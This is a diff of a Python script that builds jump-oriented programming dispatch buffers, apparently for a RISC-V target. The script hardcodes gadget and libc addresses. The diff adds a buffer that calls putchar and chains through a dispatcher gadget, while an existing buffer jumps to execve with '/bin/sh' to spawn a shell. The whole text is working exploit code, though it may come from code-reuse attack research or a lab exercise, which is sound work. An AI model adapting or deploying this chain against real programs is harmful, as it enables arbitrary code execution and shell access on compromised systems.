@@ -5,6 +5,12 @@ class dispatchBuf():
     def set_t1(self, t1):
         self.buf[22] = t1
 
+    def set_ra(self, ra):
+        self.buf[23] = ra
+
+    def set_sp(self, sp):
+        self.buf[24] = sp 
+
     def set_a0(self, a0):
         self.buf[32] = a0
 
@@ -49,6 +55,8 @@ load_from_t0 = 0x20000648da
 set_t0_s3_jump_a3 = 0x200007be24
 bin_sh_str = 0x20001178a8
 execve = 0x20000ad180
+putchar = 0x2000080bcc
+putchar_unlocked = 0x2000080cea
 
 # Where the dispatchbuf is loaded into memory
 first_dispatchbuf_ptr = 0x20000000
@@ -67,14 +75,24 @@ buf1.set_s3(next_dispatchbuf_ptr)
 # Initial jump for start_jop.S
 buf1.buf[0] = load_from_t0
 
-# This buffer jumps to execve and executes "/bin/sh"
+# This buffer jumps to putchar
 buf2 = dispatchBuf()
-buf2.set_a0(bin_sh_str)
-buf2.set_a1(0)
-buf2.set_a2(0)
-buf2.set_t1(execve)
+buf2.set_a0(ord('c'))
+# Set the stack to the first buf ptr as this shouldn't be used anymore
+buf2.set_sp(first_dispatchbuf_ptr + 48)
+# Jump to gadget which moves to next dispatcher
+buf2.set_ra(set_t0_s3_jump_a3)
+buf2.set_t1(putchar)
+
+# This buffer jumps to execve and executes "/bin/sh"
+buf3 = dispatchBuf()
+buf3.set_a0(bin_sh_str)
+buf3.set_a1(0)
+buf3.set_a2(0)
+buf3.set_t1(execve)
 
 dispatch_file.write(str(buf1))
 dispatch_file.write(str(buf2))
+dispatch_file.write(str(buf3))
 
 dispatch_file.close()
